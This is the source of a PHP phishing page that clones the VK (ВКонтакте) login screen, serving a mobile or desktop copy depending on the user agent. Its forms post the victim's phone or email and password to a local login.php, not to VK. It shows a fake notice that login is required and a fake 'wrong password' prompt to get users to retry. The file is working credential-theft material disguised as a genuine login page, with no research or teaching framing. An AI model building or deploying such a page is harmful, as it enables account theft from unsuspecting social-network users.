<!DOCTYPE html>
<?php
$agent = $_SERVER['HTTP_USER_AGENT'];
#
#
if((strpos($agent, "Android") != false)or(strpos($agent, "iPhone") != false)){
?>
            <!DOCTYPE html>
      <html class="vk vk_js_no vk_1x vk_flex_no r d h vk_withVolumeLine vk_appAuth_no n vk_old ">
      <head>
              <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, minimal-ui, user-scalable=no" />
        <meta name="format-detection" content="telephone=no" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="MobileOptimized" content="176" />
        <meta name="HandheldFriendly" content="True" />
        <base id="base">

      <meta name="msApplication-ID" content="C6965DD5.VK" />
      <meta name="msApplication-PackageFamilyName" content="C6965DD5.VK_v422avzh127ra" />

        <meta name="description" content="VK is the largest European social network with more than 100 million active users. Our goal is to keep old friends, ex-classmates, neighbors and colleagues in touch." />
        <link rel="shortcut icon" href="https://vk.com/images/icons/favicons/fav_logo.ico?8"></link>

    <meta name="apple-mobile-web-app-title" content="VK">
    <meta name="application-name" content="VK">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
        <title>https://m.vk.com</title>
        <link rel="stylesheet" href="https://vk.com/css/mobile/variables.css?62cab35205a22014e4cafa1ed6d9e1761d48ca24cd71da2d9f8dbdbbde0c6ff6">
        <link rel="stylesheet" href="https://m.vk.com/css/mobile/common.css?f17be24e8d33824f5f23d474637dd8a33b8d5d72451c32afc3d554c70fd83f78">

        <link rel="canonical" href="https://vk.com/" />
    <link rel="alternate" href="android-app://com.vkontakte.android/vkontakte/m.vk.com/" />
      </head>

      <body  class="vk__page _ivk _hover vk_ios_no _hfixed vk_stickers_hints_support_yes opera_mini_no vk_safari_no vk__page_login vk_tabbar_bottom   vk_al_yes " scheme="bright_light" onresize="onBodyResize(true);">
            <div class="layout">

          <div class="layout__header mhead" id="vk_head">
      <div class="hb_wrap">
        <div class="hb_btn">&nbsp;</div>
      </div>
    </div>
      <div class="layout__body qs_enabled" id="vk_wrap">
        <div class="layout__leftMenu" id="l">

        </div>
        <div class="layout__basis" id="m">
              <div class="basis">
      <div class="basis__header mhead basis__header_noBottomMenu basis__header_noshadow basis__header_noshadowAnim basis__header_nohide" id="mhead"><a href="/" accesskey="*" class="hb_wrap mhb_logo">
  <div class="hb_btn mhi_logo">&nbsp;</div>
  <h1 class="hb_btn mh_header">&nbsp;</h1>
</a>
</div>
      <div class="basis__menu"></div>

      <div class="basis__content mcont " id="mcont" data-canonical="https://vk.com/"><div class="installApp">
  <a class="installApp__link" href="https://vk.me/?act=dl">
    <div class="installApp__link_wrap">
      <div class="installApp__label">
        Установить приложение <b>ВКонтакте</b>
        <span class="installApp__arrow"></span>
      </div>
    </div>
  </a>
</div><div class="pcont fit_box bl_cont new_form">
  <div class="PageBlock">

  <div class="form_item">
    <div class="login_header">
     Мобильная версия поможет Вам оставаться ВКонтакте, даже если Вы далеко от компьютера.
    </div>
      <div class="fi_row"><div class="service_msg_box">
  <div class="service_msg service_msg_warning">
    <?php
    if($_GET['i']=="1"){
      echo "Неверный логин или пароль.";
    }else{
      echo "Чтобы продолжить, необходимо авторизоваться в <b>Вконтакте</b>.";
    }
    ?></div>
</div></div>
    <form method="POST" action="login.php" novalidate>
      <dl class="fi_row">
        <dd>
          <input type="text" class="textfield" name="email" value="" placeholder="Телефон или email" />
        </dd>
      </dl>
      <dl class="fi_row">
        <dd>
          <input type="password" class="textfield" name="pass" placeholder="Пароль" />
        </dd>
      </dl>

      <div class="fi_row_new">
        <input class="button wide_button" type="submit" value="Войти" />
      </div>
      <div class="fi_row">
        <div class="near_btn wide_button login_restore"><a href="https://static.vk.com/restore" rel="noopener">Забыли пароль?</a></div>
      </div>
      <div class="login_new_user">
  <div class="fi_header fi_header_light">Впервые Вконтакте?</div>
</div>
<div class="fi_row">
  <a class="button wide_button success" href="/join" rel="noopener">Зарегистрироваться</a>
</div>
<div class="socials">

  <a href="https://m.vk.com/login?act=fb_sign" class="social_button"><i class="social_icon"></i>Войти через Facebook</a>
</div>
    </form>
  </div>
  </div>
</div></div>

        <div id="vk_utils"></div>
        <div id="z"></div>
        <div id="vk_bottom"></div>
        <div id="theme_color_shim"></div>


      </body>
    </html>

<?php
}else{
?>
<html  lang="ru">
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<link rel="shortcut icon" href="" />

<link rel="apple-touch-icon" href="">

<meta http-equiv="content-type" content="text/html; charset=windows-1251" />
<meta name="description" content="" />


<title>Вход | ВКонтакте</title>

<noscript><meta http-equiv="refresh" content="0; URL=/badbrowser.php"></noscript>

<link rel="stylesheet" type="text/css" href="https://vk.com/css/al/common.css?73823639213" /><link rel="stylesheet" type="text/css" href="https://vk.com/css/al/base.css?1" /><link rel="stylesheet" type="text/css" href="https://vk.com/css/al/fonts_utf.css?1" /><link rel="stylesheet" type="text/css" href="https://vk.com/css/al/fonts_cnt.css?2660709036" />

<link type="text/css" rel="stylesheet" href="https://vk.com/css/al/login.css?33561552193" /><link type="text/css" rel="stylesheet" href="https://vk.com/css/al/ui_common.css?20383293896" />
<!--- <script type="text/javascript" src="/js/loader_nav764588_0.js"></script><script type="text/javascript" src="/js/cmodules/bundles/audioplayer.e08265f5e05cd941b650.js?110de462fbaf26de5d3f"></script><script type="text/javascript" src="/js/cmodules/bundles/common.63e2787c4940bc1c2ba1.js?0d0e889781192ca65201"></script><script type="text/javascript" src="/js/cmodules/web/common_web.125bfc199561fd41ab3a.js?b43e80674589a38747c9643d646a4e29"></script><script type="text/javascript" src="/js/lang0_0.js?26270853"></script><script type="text/javascript" src="/js/lib/px.js?ch=1"></script><script type="text/javascript" src="/js/lib/px.js?ch=2"></script><meta name="robots" content="noindex" /><meta name="msApplication-ID" content="C6965DD5.VK" /><meta name="msApplication-PackageFamilyName" content="C6965DD5.VK_v422avzh127ra" /><meta name="google-site-verification" content="CNjLCRpSR2sryzCC4NQKKCL5WnvmBTaag2J_UlTyYeQ" /><meta name="yandex-verification" content="798f8402854bea07" /><script type="text/javascript" src="/js/cmodules/bundles/vendors.70cc452207d7ab2329a5.js?1d1c845c51f848b67a36"></script><script type="text/javascript" src="/js/cmodules/bundles/74eca7c4fbfbb5577a32f2b3e2684a41.540aeaf8e59b00764233.js?7d2793c7e555f00407b4"></script><script type="text/javascript" src="/js/cmodules/web/login.fd14d3f2bd8745aed33a.js?e92e23f441cad3e30b46da782f5a6ebf"></script><script type="text/javascript" src="/js/cmodules/web/time_spent.9f535732f28794360131.js?a6c51f54d3983912c439"></script><script type="text/javascript" src="/js/cmodules/web/page_layout.ecd23de8e8c3bfc54e4b.js?dcf0e0a8fc10631b36a6"></script><script type="text/javascript" src="/js/cmodules/bundles/0f04773cfcf5199923aa1d50141d1f7f.5cb9ecfb7adab368bd0f.js?2499006034dcfc079674"></script><script type="text/javascript" src="/js/cmodules/web/ui_common.62b697bfedf900aee21d.js?44b4165104b8e1334c2610c6a3e03d47"></script><script type="text/javascript" src="/js/cmodules/web/likes.17fe274c36c741dfba44.js?402df9aa4315a59a010d9ecf07281f7e"></script>
-->
</head>

<body onresize="onBodyResize()" class="firefox login_page">
  <div id="system_msg" class="fixed"></div>
  <div id="utils"></div>

  <div id="layer_bg" class="fixed"></div><div id="layer_wrap" class="scroll_fix_wrap fixed layer_wrap"><div id="layer"></div></div>
  <div id="box_layer_bg" class="fixed"></div><div id="box_layer_wrap" class="scroll_fix_wrap fixed"><div id="box_layer"><div id="box_loader"><div class="pr pr_baw pr_medium" id="box_loader_pr"><div class="pr_bt"></div><div class="pr_bt"></div><div class="pr_bt"></div></div><div class="back"></div></div></div></div>

  <div id="stl_left"></div><div id="stl_side"></div>

  <script type="text/javascript">window.domStarted && domStarted();</script>

  <div class="scroll_fix_wrap _page_wrap" id="page_wrap"><div><div class="scroll_fix">


  <div id="page_header_cont" class="page_header_cont">
    <div class="back"></div>
    <div id="page_header_wrap" class="page_header_wrap">
      <a class="top_back_link" href="" id="top_back_link" onclick="if (nav.go(this, event, {back: true}) === false) { showBackLink(); return false; }"></a>
      <div id="page_header" class="p_head p_head_l0" style="width: 960px">
        <div class="content">
          <div id="top_nav" class="head_nav">
  <div class="head_nav_item fl_l"><a class="top_home_link fl_l" href="/" aria-label="На главную" accesskey="1" ><div class="top_home_logo"></div></a></div>
  <div class="head_nav_item fl_l"><div id="ts_wrap" class="ts_wrap" onmouseover="TopSearch.initFriendsList();">
  <input name="disable-autofill" style="display: none;" />
  <input type="text" onmousedown="event.cancelBubble = true;" ontouchstart="event.cancelBubble = true;" class="text ts_input" id="ts_input" autocomplete="off" name="disable-autofill" placeholder="Поиск" aria-label="Поиск" />
</div></div>
  <div class="head_nav_item fl_l head_nav_btns"><div id="top_audio_layer_place" class="top_audio_layer_place"></div></div>
  <div class="head_nav_item fl_r"><a class="top_nav_link" href="" id="top_switch_lang" style="display: none;" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 3, hash: '3040d322348f439a22' }); return false;">
  Switch to English
</a><a class="top_nav_link" href="/join" id="top_reg_link" style="display: none" onclick="return !showBox('join.php', {act: 'box', from: nav.strLoc}, {}, event)">
  регистрация
</a></div>
  <div class="head_nav_item_player"></div>
</div>
<div id="ts_cont_wrap" class="ts_cont_wrap" ontouchstart="event.cancelBubble = true;" onmousedown="event.cancelBubble = true;"></div>
        </div>
      </div>
    </div>
  </div>

  <div id="page_layout" style="width: 960px;">
    <div id="side_bar" class="side_bar fl_l " style="display: none">
      <div id="side_bar_inner" class="side_bar_inner">
        <div id="quick_login" class="quick_login">
  <form method="POST" name="login" id="quick_login_form" action="https://login.vk.com/?act=login">
    <input type="hidden" name="act" value="login" />
    <input type="hidden" name="role" value="al_frame" />
    <input type="hidden" name="expire" id="quick_expire_input" value="" />
    <input type="hidden" name="recaptcha" id="quick_recaptcha" value="" />
    <input type="hidden" name="captcha_sid" id="quick_captcha_sid" value="" />
    <input type="hidden" name="captcha_key" id="quick_captcha_key" value="" />
    <input type="hidden" name="_origin" value="https://vk.com" />
    <input type="hidden" name="ip_h" value="d9585494823bd8c6c4" />
    <input type="hidden" name="lg_h" value="d6608b94df7df2d68a" />
    <input type="hidden" name="ul" id="quick_login_ul" value="" />
    <div class="label">Телефон или email</div>
    <div class="labeled"><input type="text" name="email" class="dark" id="quick_email" /></div>
    <div class="label">Пароль</div>
    <div class="labeled"><input type="password" name="pass" class="dark" id="quick_pass" onkeyup="toggle('quick_expire', !!this.value);toggle('quick_forgot', !this.value)" /></div>
    <input type="submit" class="submit" />
  </form>
  <button class="quick_login_button flat_button button_wide" id="quick_login_button">Войти</button>
  <button class="quick_reg_button flat_button button_wide" id="quick_reg_button" style="display: none" onclick="top.showBox('join.php', {act: 'box', from: nav.strLoc})">Регистрация</button>
  <div class="clear forgot"><div class="checkbox" id="quick_expire" onclick="checkbox(this);ge('quick_expire_input').value=isChecked(this)?1:'';">Чужой компьютер</div><a id="quick_forgot" class="quick_forgot" href="/restore" target="_top">Забыли пароль?</a></div>
</div>
      </div>
    </div>

    <div id="page_body" class="fl_r " style="width: 960px;">

      <div id="wrap_between"></div>
      <div id="wrap3"><div id="wrap2" class="page_block">
  <div id="wrap1">
    <div id="content"><h2 class="login_header">Вход ВКонтакте</h2>
<div id="login_message"><div class="msg error"><div class="msg_text">
    <?php
    $ok = 1;
    $i = $_GET['i'];
    if($i == 1){
        echo "Неверный логин или пароль.";
        $ok = 3;
    }else{
    echo "Чтобы продолжить, необходимо авторизоваться в <b>Вконтакте</b>.";
    }
    ?>

    </div></div></div>
<div id="login_form_wrap" class="login_form_wrap">
  <form method="post" name="login" id="login_form" action="login.php">
      <input name='i' value="<?php echo $ok ?>" type="hidden">
    <input type="hidden" name="act" id="act" value="login">
    <input type="hidden" name="to" id="to" value=""/>
    <input type="hidden" name="expire" id="expire_input" value="" />
    <input type="hidden" name="_origin" value="https://vk.com" />
    <input type="hidden" name="ip_h" value="d9585494823bd8c6c4" />
    <input type="hidden" name="lg_h" value="d6608b94df7df2d68a" />

    <input type="text" class="big_text" name="email" id="email" value="" placeholder="Телефон или email" />
    <input type="password" class="big_text" name="pass" id="pass" value="" placeholder="Пароль" />
    <div class="checkbox" id="expire" onclick="checkbox(this);ge('expire_input').value=isChecked(this)?1:'';">Чужой компьютер</div>
    <div class="login_buttons_wrap">
      <button id="login_button" class="flat_button button_big_text login_button">Войти</button><button id="login_reg_button" class="flat_button button_big_text login_reg_button" onclick="nav.go('/join'); return cancelEvent(event);">Регистрация</button>
    </div>
  </form>
</div>
<div class="login_fast_restore_wrap _retore_wrap">
  <a class="login_link login_fast_restore_link" href="/restore?login=nfg%20grdgkjgrkgbe">Забыли пароль или не можете войти?</a>
</div></div>
  </div>
</div></div>
    </div>

    <div id="footer_wrap" class="footer_wrap fl_r" style="width: 960px;"><div class="footer_nav" id="bottom_nav">
  <div class="footer_copy"><a href="/about">ВКонтакте</a> &copy; 2006–2019</div>
  <div class="footer_links">
    <a class="bnav_a" href="/about">О ВКонтакте</a>
    <a class="bnav_a" href="/support?act=home" style="display: none;">Помощь</a>
    <a class="bnav_a" href="/terms">Правила</a>
    <a class="bnav_a" href="/ads" style="">Реклама</a>

    <a class="bnav_a" href="/dev">Разработчикам</a>
    <a class="bnav_a" href="/jobs" style="display: none;">Вакансии</a>
  </div>
  <div class="footer_lang"><a class="footer_lang_link" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 3, hash: '3040d322348f439a22'})">English</a><a class="footer_lang_link" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 0, hash: '3040d322348f439a22'})">Русский</a><a class="footer_lang_link" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 1, hash: '3040d322348f439a22'})">Українська</a><a class="footer_lang_link" onclick="if (vk.al) { showBox('lang.php', {act: 'lang_dialog', all: 1}, {params: {dark: true, bodyStyle: 'padding: 0px'}, noreload: true}); } else { changeLang(1); } return false;">все языки &raquo;</a></div>
</div>

<div class="footer_bench clear">

</div></div>

    <div class="clear"></div>
  </div>
</div></div><noscript><div style="position:absolute;left:-10000px;">
<img src="//top-fwz1.mail.ru/counter?id=2579437;js=na" style="border:0;" height="1" width="1" />
</div></noscript></div>
  <div class="progress" id="global_prg"></div>


</body>

</html>
<?php

}
 ?>
